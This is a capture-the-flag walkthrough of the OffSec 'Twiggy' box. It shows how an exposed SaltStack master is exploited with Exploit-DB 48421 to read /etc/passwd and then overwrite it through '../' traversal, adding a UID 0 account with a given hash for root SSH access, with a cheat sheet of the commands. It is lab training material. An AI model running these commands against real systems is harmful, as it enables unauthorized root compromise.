---

tags:

- ctf
    
- offsec
    
- proving-grounds
    
- linux
    
- saltstack
    
- zeromq
    
- python
    
- python-venv
    
- exploit-development
    
- dependency-management
    
- arbitrary-file-read
    
- arbitrary-file-write
    
- path-traversal
    
- passwd
    
- ssh
    
- privilege-escalation
    
- root
    
- vpn
    
- mtu
    

---

# Twiggy

## Overview

**Platform:** OffSec  
**Operating System:** Linux  
**Primary Service:** SaltStack / ZeroMQ  
**Interesting Ports:** `4505`, `4506`  
**Initial Access Technique:** SaltStack vulnerability  
**Privilege Escalation:** Arbitrary file write to `/etc/passwd`  
**Final Access:** Root-equivalent SSH account

### Key Techniques

- Full TCP port enumeration
    
- Service/version enumeration
    
- Recognising SaltStack through ports `4505` and `4506`
    
- Using Exploit-DB exploit `48421`
    
- Creating a Python virtual environment
    
- Resolving missing Python dependencies
    
- Arbitrary file read
    
- Arbitrary file upload/write
    
- Relative-path traversal
    
- Overwriting `/etc/passwd`
    
- Creating a UID `0` account
    
- SSH access as a root-equivalent user
    
- Troubleshooting VPN/MTU issues
    

---

# Attack Path

```text
Port Enumeration
        ↓
Identify ZeroMQ on 4505/4506
        ↓
Associate Ports with SaltStack
        ↓
Download Exploit 48421
        ↓
Resolve Python Dependencies
        ↓
Exploit SaltStack
        ↓
Read /etc/passwd
        ↓
Create Malicious passwd Entry
        ↓
Overwrite /etc/passwd
        ↓
SSH as UID 0 User
        ↓
Root Access
```

---

# 1. Reconnaissance

## Fast Port Scan

The walkthrough initially uses RustScan to obtain quick results.

```bash
sudo grc rustscan --ulimit 5000 -a 192.168.219.62 |tee rustscan.txt
```

RustScan is then verified using a full Nmap scan.

```bash
sudo grc nmap -p- -oA tcp 192.168.219.62
```

An alternative faster Nmap scan is:

```bash
grc nmap -p- --min-rate 5000 192.168.219.62
```

> [!tip] Methodology  
> A fast scanner is useful for obtaining initial results, but important findings should still be verified with Nmap.

---

# 2. Detailed Service Enumeration

The discovered RustScan ports can be extracted automatically and supplied to Nmap.

```bash
# no need to change anything here. just make sure the port list is correct
ports=$(cat rustscan.txt |grep '^Open ' |sed -e 's/^.*://g' |sort -n |tr '\n' ',' |sed 's/,$//')
grc nmap -p$ports -sC -sV -sT -n -A -T4 -Pn --open -oN nmap.out 192.168.219.62
```

## Discovered Services

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```

### Interesting Ports

|Port|Service|Significance|
|---|---|---|
|`22`|SSH|Potential remote login|
|`53`|DNS|DNS enumeration|
|`80`|nginx / Mezzanine|Web application|
|`4505`|ZeroMQ ZMTP|SaltStack communication|
|`4506`|ZeroMQ ZMTP|SaltStack communication|
|`8000`|nginx / JSON|Additional web/API service|

---

# 3. Initial Exploit Research

Initial Searchsploit checks included:

```bash
searchsploit Mezzanine
searchsploit nginx 1.16.1
searchsploit ZeroMQ ZMTP 2.0
```

These searches did not immediately expose the intended attack path.

The important observation was the presence of:

```text
4505/tcp open zmtp ZeroMQ ZMTP 2.0
4506/tcp open zmtp ZeroMQ ZMTP 2.0
```

These ports are associated with SaltStack communication.

> [!tip] Recognition Pattern  
> If TCP ports **4505 and 4506** are exposed, investigate whether the host is running **SaltStack / Salt Master** rather than searching only for generic ZeroMQ vulnerabilities.

---

# 4. Downloading the SaltStack Exploit

The exploit used in the walkthrough was Exploit-DB `48421`.

```bash
wget https://www.exploit-db.com/download/48421
```

Inspect the exploit before executing it.

```bash
subl 48421
```

---

# 5. Python Exploit Environment Problems

Attempting to execute the exploit using different Python versions resulted in dependency errors.

```bash
python3 48421
python2.7 48421
python2 48421
python 48421
```

Python 3 reported that the Salt library was unavailable.

Initial attempts included:

```bash
pip install salt
pip3 install salt
```

On modern Kali installations, system-wide `pip` installations may fail because Python is an externally managed environment.

Typical error:

```text
error: externally-managed-environment
```

Attempting:

```bash
apt install python3-salt
```

was also unsuccessful in the walkthrough.

---

# 6. Create a Python Virtual Environment

The clean solution is to create a dedicated Python virtual environment.

## Create the Environment

```bash
python3 -m venv salt-env
```

The name can be changed if required.

## Activate the Environment

```bash
source salt-env/bin/activate
```

## Install Salt

```bash
pip3 install salt
```

> [!tip] Recognition Pattern  
> If an exploit fails with:
> 
> ```text
> ModuleNotFoundError: No module named 'something'
> ```
> 
> or Kali refuses a system-wide `pip` install because of PEP 668, create a virtual environment instead of modifying the system Python installation.

---

# 7. Resolving Python Dependencies

Installing `salt` did not satisfy every dependency required by the exploit.

Additional modules were installed as errors appeared.

## PyYAML

If Python complains about the `yaml` module:

```bash
pip install pyyaml
```

Do **not** install a package named simply `yaml`.

---

## LooseVersion

```bash
pip install looseversion
```

---

## Packaging

```bash
pip install packaging
```

---

## Tornado

```bash
pip install tornado
```

---

## Msgpack

```bash
pip install msgpack
```

---

## Distro

```bash
pip install distro
```

---

## Jinja2

```bash
pip install jinja2
```

---

## ZeroMQ

```bash
pip install zmq
```

---

# Python Exploit Dependency Checklist

If the SaltStack exploit is failing because of missing modules, the walkthrough ultimately required:

```bash
pip3 install salt
pip install pyyaml
pip install looseversion
pip install packaging
pip install tornado
pip install msgpack
pip install distro
pip install jinja2
pip install zmq
```

> [!note] Better Workflow  
> Keep exploit-specific dependencies inside the virtual environment. This prevents conflicts with Kali's system Python packages.

---

# 8. Testing Arbitrary File Read

Once the exploit executed successfully, it was used to read `/etc/passwd`.

```bash
python3 48421 --master 192.168.63.62 --read /etc/passwd
```

The walkthrough initially experienced connection timeouts.

---

# 9. VPN / MTU Troubleshooting

The timeout was attributed to the OffSec VPN connection.

The workaround used was:

```bash
sudo ip link set dev tun0 mtu 800
```

The walkthrough notes that MTU values between approximately:

```text
700 - 1300
```

may be worth testing.

> [!warning] Only Change MTU When Needed  
> Do not automatically modify the VPN MTU. This was a troubleshooting step for a connectivity problem encountered in the walkthrough.

> [!tip] Recognition Pattern  
> If an exploit appears logically correct but repeatedly times out across the VPN, investigate routing, packet fragmentation and the MTU of `tun0`.

Useful checks include:

```bash
ip addr show tun0
ip route
ping <target>
```

---

# 10. Confirming Arbitrary File Read

After correcting the connectivity issue, the exploit successfully returned the contents of:

```text
/etc/passwd
```

This establishes an **arbitrary file read** primitive.

The next question should be:

> Can the same vulnerability also write arbitrary files?

The exploit supports file upload functionality, making arbitrary file write possible.

---

# 11. Creating a Root-Equivalent User

The walkthrough uses the following passwd entry:

```text
pwend:$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash
```

Important fields:

```text
pwend:
$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:
0:
0:
root:
/root:
/bin/bash
```

The critical values are:

```text
UID = 0
GID = 0
```

UID `0` gives the account root privileges.

---

# 12. Preparing the Modified passwd File

Create a local file:

```bash
subl passwd
```

Copy the legitimate contents of the remote:

```text
/etc/passwd
```

into the local file.

Then append:

```text
pwend:$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash
```

Save the file.

> [!warning] Preserve Existing passwd Entries  
> Do not upload a file containing only the malicious account. Preserve the legitimate `/etc/passwd` entries and add the new account to them.

---

# 13. Attempting the Arbitrary File Upload

The obvious destination initially attempted was:

```bash
python3 48421 --master 192.168.143.62 --upload-dest /etc/passwd --upload-src passwd
```

This returned:

```text
[-] Destination path must be relative; aborting
```

This reveals an important restriction:

> The destination supplied to the exploit must be a **relative path**.

---

# 14. Bypassing the Relative Path Restriction

The Salt files are written relative to:

```text
/srv/salt/
```

Path traversal can therefore be used to escape this directory.

The walkthrough uses:

```bash
python3 48421 --master 192.168.143.62 --upload-dest ../../../etc/passwd --upload-src passwd
```

The exploit reported:

```text
Wrote data to file /srv/salt/../../../etc/passwd
```

Once normalized by the filesystem, this resolves to:

```text
/etc/passwd
```

> [!tip] Recognition Pattern  
> If an upload function only accepts **relative paths**, test whether `../` traversal allows the destination directory to be escaped.

Conceptually:

```text
/srv/salt/
    +
../../../etc/passwd

        ↓

/etc/passwd
```

---

# 15. Verify the File Write

Never assume an exploit succeeded based solely on its output.

Read `/etc/passwd` again:

```bash
python3 48421 --master 192.168.143.62 --read /etc/passwd --port 4506
```

Check that the malicious entry exists:

```text
pwend:$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash
```

> [!tip] Exploitation Principle  
> Always verify state-changing exploitation separately. An exploit can return an error even though the underlying operation succeeded, or report success when it did not.

---

# 16. Root Access via SSH

Once the UID `0` account exists, connect over SSH.

```bash
ssh pwend@192.168.143.62
```

Because the account has:

```text
UID 0
GID 0
```

the resulting shell has root-equivalent privileges.

---

# 17. Confirm Compromise

Capture useful evidence:

```bash
whoami; hostname; ifconfig;
```

Additional useful checks:

```bash
id
pwd
uname -a
```

Expected privilege level:

```text
uid=0
```

---

# Reusable Attack Methodology

When encountering SaltStack or exposed ZeroMQ services:

## 1. Identify the Service

Look for:

```text
4505/tcp
4506/tcp
```

Do not assume that identifying the underlying transport as ZeroMQ is sufficient.

Ask:

```text
What application normally uses these ports?
```

---

## 2. Search for SaltStack Vulnerabilities

Search by the actual application:

```bash
searchsploit saltstack
searchsploit salt
```

Investigate applicable Salt Master vulnerabilities.

---

## 3. Inspect the Exploit

Before running downloaded exploit code:

```bash
less exploit.py
```

or:

```bash
subl exploit.py
```

Identify:

- Required Python version
    
- Required modules
    
- Target ports
    
- Supported read/write operations
    
- Required arguments
    

---

## 4. Isolate Python Dependencies

```bash
python3 -m venv exploit-env
source exploit-env/bin/activate
```

Then install required packages:

```bash
pip install <package>
```

---

## 5. Test Low-Impact Functionality First

If arbitrary file read is available:

```bash
python3 exploit.py --master <TARGET> --read /etc/passwd
```

This confirms exploitation without immediately altering the target.

---

## 6. Investigate Write Capabilities

If file upload exists, determine:

- Where uploaded files are written
    
- Whether absolute paths are allowed
    
- Whether `../` traversal is possible
    
- Which privileged files are useful targets
    

---

## 7. Convert File Write into Code Execution

Potential targets depend on the permissions and system configuration.

In Twiggy, the chosen target was:

```text
/etc/passwd
```

The malicious account used:

```text
UID 0
GID 0
```

---

## 8. Verify Every Change

For example:

```bash
python3 exploit.py --master <TARGET> --read /etc/passwd
```

Do not rely solely on exploit output.

---

# Quick Reference

## Port Enumeration

```bash
sudo grc rustscan --ulimit 5000 -a <TARGET> |tee rustscan.txt
```

```bash
sudo grc nmap -p- -oA tcp <TARGET>
```

```bash
grc nmap -p- --min-rate 5000 <TARGET>
```

---

## Detailed Nmap Scan

```bash
ports=$(cat rustscan.txt |grep '^Open ' |sed -e 's/^.*://g' |sort -n |tr '\n' ',' |sed 's/,$//')
grc nmap -p$ports -sC -sV -sT -n -A -T4 -Pn --open -oN nmap.out <TARGET>
```

---

## Create Python Virtual Environment

```bash
python3 -m venv salt-env
source salt-env/bin/activate
```

---

## Install SaltStack Exploit Dependencies

```bash
pip3 install salt
pip install pyyaml
pip install looseversion
pip install packaging
pip install tornado
pip install msgpack
pip install distro
pip install jinja2
pip install zmq
```

---

## Download Exploit

```bash
wget https://www.exploit-db.com/download/48421
```

---

## Read Remote File

```bash
python3 48421 --master <TARGET> --read /etc/passwd
```

---

## Upload File

```bash
python3 48421 --master <TARGET> --upload-dest ../../../etc/passwd --upload-src passwd
```

---

## Verify File

```bash
python3 48421 --master <TARGET> --read /etc/passwd --port 4506
```

---

## SSH

```bash
ssh pwend@<TARGET>
```

---

## Evidence

```bash
whoami; hostname; ifconfig;
```

---

# Troubleshooting

## `externally-managed-environment`

### Symptom

```text
error: externally-managed-environment
```

### Solution

Create a virtual environment:

```bash
python3 -m venv exploit-env
source exploit-env/bin/activate
```

Then:

```bash
pip install <required-package>
```

---

## `No module named yaml`

Install:

```bash
pip install pyyaml
```

---

## Other Missing Python Modules

Install the module indicated by the Python error.

Examples from this exploit:

```bash
pip install looseversion
pip install packaging
pip install tornado
pip install msgpack
pip install distro
pip install jinja2
pip install zmq
```

---

## Exploit Timeout

Check:

```bash
ping <TARGET>
ip route
ip addr show tun0
```

If the OffSec VPN is suffering from fragmentation issues, the walkthrough used:

```bash
sudo ip link set dev tun0 mtu 800
```

---

## `Destination path must be relative`

### Problem

```text
[-] Destination path must be relative; aborting
```

### Instead of

```text
/etc/passwd
```

try a traversal path such as:

```text
../../../etc/passwd
```

when the application permits it.

---

# Key Lessons

> [!tip] Ports Can Identify Applications  
> `4505` and `4506` may appear simply as ZeroMQ/ZMTP during scanning, but they are strong indicators of SaltStack. Search for vulnerabilities in the application using the protocol, not just the protocol itself.

> [!tip] Use Python Virtual Environments  
> Modern Kali protects its system Python environment. For standalone exploit scripts, create a virtual environment and install dependencies there.

> [!tip] Follow Dependency Errors  
> `ModuleNotFoundError` is frequently an environment problem rather than an exploit failure. Install the missing dependency inside the virtual environment and retry.

> [!tip] Read Before Write  
> When an exploit provides arbitrary file access, test file reading first. It verifies the vulnerability while making minimal changes to the target.

> [!tip] Relative Path Restrictions May Be Bypassable  
> A restriction requiring relative paths does not necessarily prevent writing outside the intended directory. Check whether `../` traversal is possible.

> [!warning] Verify Exploit Results  
> Do not blindly trust either success or error messages. Confirm the resulting state independently.

> [!tip] Arbitrary File Write Is Powerful  
> On Linux, arbitrary privileged file write can often be converted into code execution or privilege escalation depending on which files are writable.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|`4505/tcp` open|SaltStack|
|`4506/tcp` open|SaltStack|
|ZeroMQ on 4505/4506|Salt Master vulnerabilities|
|`ModuleNotFoundError`|Missing Python dependency|
|`externally-managed-environment`|Python virtual environment|
|Upload requires relative path|Directory traversal|
|Arbitrary read of `/etc/passwd`|Privileged file access|
|Arbitrary write as root|Privilege escalation / code execution|
|VPN exploit timeout|Routing / MTU / fragmentation|
